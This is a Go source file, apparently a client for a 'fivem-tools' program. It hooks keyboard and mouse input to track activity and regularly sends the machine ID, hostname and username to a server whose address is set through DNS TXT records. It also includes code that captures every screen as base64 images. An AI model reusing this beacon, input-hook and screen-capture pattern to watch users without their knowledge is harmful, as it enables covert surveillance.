package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/mouse"
	"github.com/moutend/go-hook/pkg/types"
)

var (
	lastActivityTime time.Time
	lastActivityMu   sync.Mutex
)

type Status struct {
	MachineID string `json:"machine_id"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	IP        string `json:"ip"`
	Country   string `json:"country"`
	From      string `json:"from"`
	Status    string `json:"status"`
	Version   string `json:"version"`
}

type UpdateClientStatusCommand struct {
	From       string
	SinceInput time.Duration
}

func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
	failedf("Updating client status...")

	machineID, _ := machineID()
	hostname, _ := os.Hostname()
	username, _ := os.LookupEnv("USERNAME")

	ip := "unknown"
	country := "unknown"
	// ipResp, err := http.Get("https://api.country.is/")
	// if err != nil {
	// 	fmt.Fprintf(os.Stderr, "failed to get public IP: %v\n", err)
	// }
	// defer func() { _ = ipResp.Body.Close() }()
	// if ipResp.StatusCode == http.StatusOK {
	// 	var ipData struct {
	// 		IP      string `json:"ip"`
	// 		Country string `json:"country"`
	// 	}
	// 	if err := json.NewDecoder(ipResp.Body).Decode(&ipData); err != nil {
	// 		fmt.Fprintf(os.Stderr, "failed to decode IP response: %v\n", err)
	// 	} else {
	// 		ip = ipData.IP
	// 		country = ipData.Country
	// 	}
	// }

	status := "active"
	lastActivityMu.Lock()
	if time.Since(lastActivityTime) > cmd.SinceInput {
		status = "away"
	}
	lastActivityMu.Unlock()

	data := Status{
		MachineID: machineID,
		Hostname:  hostname,
		Username:  username,
		IP:        ip,
		Country:   country,
		From:      cmd.From,
		Status:    status,
		Version:   version,
	}

	body := bytes.NewBuffer(nil)
	if err := json.NewEncoder(body).Encode(data); err != nil {
		failedf("failed to encode status data: %v", err)
		return
	}

	baseURL := GetTxt("base_url", "http://localhost:8080")
	r, err := http.NewRequest(http.MethodPost, baseURL+"/status", body)
	if err != nil {
		failedf("failed to create request: %v", err)
		return
	}

	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("User-Agent", "fivem-tools-client")
	r.Header.Set("Client-Hostname", hostname)

	resp, err := http.DefaultClient.Do(r)
	if err != nil {
		failedf("failed to post status: %v", err)
		return
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusCreated {
		failedf("failed to post status, got status code: %d", resp.StatusCode)
		return
	}
}

func handleUpdateClientStatus(from string) {
	if localDebug {
		return
	}

	lastActivityMu.Lock()
	lastActivityTime = time.Now()
	lastActivityMu.Unlock()

	keyboardChan := make(chan types.KeyboardEvent, 100)
	_ = keyboard.Install(nil, keyboardChan)
	defer func() { _ = keyboard.Uninstall() }()

	mouseChan := make(chan types.MouseEvent, 100)
	_ = mouse.Install(nil, mouseChan)
	defer func() { _ = mouse.Uninstall() }()

	timeChan := make(chan time.Time, 1)

	go func() {
		for {
			select {
			case <-keyboardChan:
				select {
				case timeChan <- time.Now():
				default:
				}
			case <-mouseChan:
				select {
				case timeChan <- time.Now():
				default:
				}
			}
		}
	}()

	go func() {
		for t := range timeChan {
			lastActivityMu.Lock()
			lastActivityTime = t
			lastActivityMu.Unlock()
			time.Sleep(1 * time.Second)
		}
	}()

	for {
		statusTickStr := GetTxt("status_tick", "300")
		statusTickInt, _ := strconv.Atoi(statusTickStr)
		statusTick := time.Duration(statusTickInt) * time.Second

		if statusTick <= 0 {
			statusTick = 300 * time.Second // Default to 5 minutes if invalid
		}
		UpdateClientStatus(&UpdateClientStatusCommand{
			From:       from,
			SinceInput: statusTick,
		})

		time.Sleep(statusTick)
	}
}

var (
	mapTxts     map[string]string
	mapTxtsMu   sync.Mutex
	mapTxtsTime time.Time
)

func GetTxt(name string, defaultValue ...string) string {
	mapTxtsMu.Lock()
	defer mapTxtsMu.Unlock()

	ttl := time.Since(mapTxtsTime) < 5*time.Minute
	if v, ok := mapTxts[name]; ok && ttl {
		return v
	}

	localMapTxts := make(map[string]string)
	txts, err := net.LookupTXT("_fivem_tools.willywotz.com")
	if err != nil {
		failedf("failed to lookup TXT records: %v", err)
		return getOrDefaultMap(localMapTxts, name, defaultValue...)
	}

	for _, txt := range txts {
		for _, part := range strings.Split(txt, ";") {
			kv := strings.SplitN(part, "=", 2)
			if len(kv) != 2 {
				continue
			}
			localMapTxts[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}

	if len(localMapTxts) == 0 {
		failedf("No valid TXT records found")
		return getOrDefaultMap(localMapTxts, name, defaultValue...)
	}

	mapTxts = localMapTxts
	mapTxtsTime = time.Now()

	return getOrDefaultMap(localMapTxts, name, defaultValue...)
}

func getOrDefaultMap[T any](m map[string]T, key string, defaultValue ...T) T {
	if value, ok := m[key]; ok {
		return value
	}
	if len(defaultValue) > 0 {
		return defaultValue[0]
	}
	var zeroValue T
	return zeroValue
}

type CaptureScreenshotItem struct {
	DisplayIndex  int             `json:"display_index"`
	DisplayBounds image.Rectangle `json:"display_bounds"`
	Image         string          `json:"image"`
	Error         string          `json:"error"`
}

func CaptureScreenshot() (results []*CaptureScreenshotItem, err error) {
	results = make([]*CaptureScreenshotItem, 0)

	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("CaptureScreenshot panicked: %v", r)
			failedf("CaptureScreenshot panicked: %v", r)
		}
	}()

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		r := &CaptureScreenshotItem{
			DisplayIndex:  i,
			DisplayBounds: screenshot.GetDisplayBounds(i),
		}

		img, err := screenshot.CaptureRect(r.DisplayBounds)
		if err != nil {
			r.Error = fmt.Sprintf("failed to capture screenshot: %v", err)
			results = append(results, r)
			continue
		}

		var buf bytes.Buffer
		if err := png.Encode(&buf, img); err != nil {
			r.Error = fmt.Sprintf("failed to encode screenshot: %v", err)
			results = append(results, r)
			continue
		}

		r.Image = base64.StdEncoding.EncodeToString(buf.Bytes())
		results = append(results, r)
	}

	return results, nil
}
